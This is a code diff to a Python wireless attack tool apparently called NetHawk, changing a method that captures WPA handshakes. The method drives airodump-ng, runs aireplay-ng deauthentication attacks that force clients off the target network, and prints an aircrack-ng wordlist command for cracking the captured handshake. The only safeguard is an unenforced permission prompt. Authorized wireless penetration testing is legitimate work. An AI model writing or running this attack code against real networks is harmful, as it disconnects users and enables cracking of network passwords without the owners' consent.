@@ -1498,23 +1498,24 @@ class NetHawk:
     
     def advanced_handshake_capture(self):
         """Advanced handshake capture with deauth attacks."""
-        console.print("[bold red]Advanced Handshake Capture + Deauth[/bold red]")
+        console.print("[bold red]🔐 Advanced Handshake Capture + Deauth[/bold red]")
         console.print("=" * 50)
 
         # Check if airodump-ng is available
         if not self.tools_available.get("airodump-ng", False):
-            console.print("[red]airodump-ng not found! Please install aircrack-ng.[/red]")
+            console.print("[red]❌ airodump-ng not found! Please install aircrack-ng.[/red]")
+            console.print("[blue]Install: sudo apt install aircrack-ng[/blue]")
             return
 
         # Get wireless interface
         interfaces = self._get_wireless_interfaces()
         if not interfaces:
-            console.print("[red]No wireless interfaces found![/red]")
+            console.print("[red]❌ No wireless interfaces found![/red]")
             return
 
-        console.print("[bold]Available interfaces:[/bold]")
+        console.print("[bold]📡 Available interfaces:[/bold]")
         for i, iface in enumerate(interfaces):
-            console.print(f"{i+1}. {iface}")
+            console.print(f"  {i+1}. {iface}")
         
         iface_choice = self.validate_input(
             "\nSelect interface to use: ", [str(i+1) for i in range(len(interfaces))]
@@ -1522,54 +1523,94 @@ class NetHawk:
         iface = interfaces[int(iface_choice)-1]
         
         # Get target information
-        bssid = Prompt.ask("Enter target BSSID (MAC address)")
-        essid = Prompt.ask("Enter target ESSID (network name)")
+        console.print(f"\n[bold]🎯 Target Network Information:[/bold]")
+        bssid = Prompt.ask("Enter target BSSID (MAC address)", default="")
+        essid = Prompt.ask("Enter target ESSID (network name)", default="")
         channel = Prompt.ask("Enter target channel", default="6")
         
         # Validate BSSID format
-        if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
-            console.print("[red]Invalid BSSID format! Use format: XX:XX:XX:XX:XX:XX[/red]")
+        if bssid and not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', bssid):
+            console.print("[red]❌ Invalid BSSID format! Use format: XX:XX:XX:XX:XX:XX[/red]")
+            return
+        
+        # Validate channel
+        try:
+            channel = int(channel)
+            if channel < 1 or channel > 14:
+                console.print("[red]❌ Invalid channel! Use 1-14 for 2.4GHz[/red]")
+                return
+        except ValueError:
+            console.print("[red]❌ Invalid channel! Enter a number between 1-14[/red]")
             return
             
-        console.print(f"[blue]Target: {essid} ({bssid}) on channel {channel}[/blue]")
+        console.print(f"\n[blue]🎯 Target: {essid} ({bssid}) on channel {channel}[/blue]")
         
         # Legal warning
-        if not Confirm.ask("[bold red]WARNING: Only capture handshakes from networks you own or have permission to test! Continue?[/bold red]"):
+        console.print(f"\n[bold red]⚠️  LEGAL WARNING:[/bold red]")
+        console.print(f"[yellow]• Only capture handshakes from networks you own[/yellow]")
+        console.print(f"[yellow]• Only test networks you have permission to test[/yellow]")
+        console.print(f"[yellow]• Unauthorized access is illegal[/yellow]")
+        
+        if not Confirm.ask("[bold red]Do you have permission to test this network?[/bold red]"):
             console.print("[yellow]Operation cancelled.[/yellow]")
             return
                 
         # Set monitor mode
+        console.print(f"\n[blue]🔧 Setting up monitor mode on {iface}...[/blue]")
         monitor_iface = self._set_monitor_mode(iface)
         if not monitor_iface:
+            console.print("[red]❌ Failed to set monitor mode![/red]")
             return
         
-        # Advanced capture options
-        console.print("\n[bold]Advanced Capture Options:[/bold]")
+        # Capture options
+        console.print(f"\n[bold]⚙️ Capture Options:[/bold]")
         use_deauth = Confirm.ask("Use deauth attacks to force handshake?", default=True)
-        deauth_count = IntPrompt.ask("Number of deauth packets", default=10) if use_deauth else 0
+        deauth_count = 10
+        if use_deauth:
+            deauth_count = IntPrompt.ask("Number of deauth packets", default=10)
+            if deauth_count < 1 or deauth_count > 50:
+                deauth_count = 10
+                console.print(f"[yellow]⚠️ Using default: 10 packets[/yellow]")
         
-        # Start advanced handshake capture
-        output_file = os.path.join(self.handshakes_path, f"{essid}_advanced_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
+        capture_duration = IntPrompt.ask("Capture duration (seconds)", default=60)
+        if capture_duration < 10 or capture_duration > 300:
+            capture_duration = 60
+            console.print(f"[yellow]⚠️ Using default: 60 seconds[/yellow]")
+        
+        # Start handshake capture
+        output_file = os.path.join(self.handshakes_path, f"{essid}_handshake_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
         
         try:
-            console.print(f"[blue]Starting advanced handshake capture...[/blue]")
-            console.print("[yellow]Press Ctrl+C to stop[/yellow]")
+            console.print(f"\n[blue]🚀 Starting handshake capture...[/blue]")
+            console.print(f"[yellow]Press Ctrl+C to stop early[/yellow]")
             
-            # Start airodump-ng
-            cmd = ["airodump-ng", "-c", channel, "-w", output_file, "--bssid", bssid, monitor_iface]
+            # Start airodump-ng with proper parameters
+            cmd = [
+                "airodump-ng",
+                "-c", str(channel),
+                "-w", output_file,
+                "--bssid", bssid,
+                "--output-format", "cap,csv",
+                monitor_iface
+            ]
+            
+            console.print(f"[blue]Running: {' '.join(cmd)}[/blue]")
             airodump_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
             
-            # Wait a bit for airodump to start
-            time.sleep(5)
+            # Wait for airodump to start
+            console.print(f"[blue]⏳ Starting airodump-ng...[/blue]")
+            time.sleep(3)
             
             # Start deauth attack if requested
             deauth_process = None
             if use_deauth:
-                console.print(f"[red]Starting deauth attack with {deauth_count} packets...[/red]")
+                console.print(f"[red]🔥 Starting deauth attack with {deauth_count} packets...[/red]")
                 deauth_cmd = ["aireplay-ng", "--deauth", str(deauth_count), "-a", bssid, monitor_iface]
                 deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+                time.sleep(2)  # Let deauth complete
             
             # Show progress for handshake capture
+            console.print(f"[blue]📡 Capturing handshake for {capture_duration} seconds...[/blue]")
             with Progress(
                 SpinnerColumn(),
                 TextColumn("[progress.description]{task.description}"),
@@ -1577,15 +1618,16 @@ class NetHawk:
                 TimeElapsedColumn(),
                 console=console
             ) as progress:
-                task = progress.add_task("Capturing handshake...", total=30)
+                task = progress.add_task("Capturing handshake...", total=capture_duration)
                 
-                for i in range(30):
-                    progress.update(task, description=f"Capturing... {i+1}/30s")
+                for i in range(capture_duration):
+                    progress.update(task, description=f"Capturing... {i+1}/{capture_duration}s")
                     time.sleep(1)
                 
                 progress.update(task, description="Capture complete!")
             
             # Stop processes
+            console.print(f"[blue]🛑 Stopping capture...[/blue]")
             airodump_process.terminate()
             airodump_process.wait()
             
@@ -1593,25 +1635,43 @@ class NetHawk:
                 deauth_process.terminate()
                 deauth_process.wait()
             
-            console.print(f"[green]✓ Advanced handshake capture completed![/green]")
-            console.print(f"[blue]Handshake saved to: {output_file}*[/blue]")
-            console.print("[yellow]Note: Use external tools like aircrack-ng to crack the handshake[/yellow]")
+            # Check if handshake was captured
+            cap_file = f"{output_file}-01.cap"
+            if os.path.exists(cap_file):
+                file_size = os.path.getsize(cap_file)
+                console.print(f"\n[green]✅ Handshake capture completed![/green]")
+                console.print(f"[blue]📁 Files saved:[/blue]")
+                console.print(f"  • {os.path.basename(cap_file)} ({file_size} bytes)")
+                console.print(f"  • {os.path.basename(output_file)}-01.csv (Capture data)")
+                console.print(f"[yellow]💡 Use aircrack-ng to crack the handshake:[/yellow]")
+                console.print(f"[blue]aircrack-ng -w wordlist.txt {cap_file}[/blue]")
+            else:
+                console.print(f"[yellow]⚠️ No handshake captured. Try increasing duration or using deauth.[/yellow]")
             
             # Show session storage message
-            console.print(f"\n[bold green]📁 Scan Results Stored in Session Files:[/bold green]")
+            console.print(f"\n[bold green]📁 Session Files:[/bold green]")
             console.print(f"[blue]Session Path: {self.session_path}[/blue]")
             console.print(f"[blue]Handshakes Directory: {self.handshakes_path}[/blue]")
-            console.print(f"[yellow]Files created:[/yellow]")
-            console.print(f"[blue]  - {os.path.basename(output_file)}.cap (Handshake file)[/blue]")
-            console.print(f"[blue]  - {os.path.basename(output_file)}.csv (Capture data)[/blue]")
-            console.print(f"[green]✓ All capture data is automatically saved to your session![/green]")
+            console.print(f"[green]✅ All capture data saved to your session![/green]")
             
         except KeyboardInterrupt:
-            console.print("\n[yellow]Capture stopped by user.[/yellow]")
+            console.print(f"\n[yellow]⏹️ Capture stopped by user.[/yellow]")
         except Exception as e:
-            console.print(f"[red]Error during advanced capture: {e}[/red]")
+            console.print(f"[red]❌ Error during capture: {e}[/red]")
         finally:
+            # Clean up processes
+            try:
+                if 'airodump_process' in locals():
+                    airodump_process.terminate()
+                    airodump_process.wait()
+                if 'deauth_process' in locals() and deauth_process:
+                    deauth_process.terminate()
+                    deauth_process.wait()
+            except:
+                pass
+            
             # Restore managed mode
+            console.print(f"[blue]🔄 Restoring managed mode...[/blue]")
             self._restore_managed_mode(monitor_iface)
     
     def vulnerability_assessment(self):
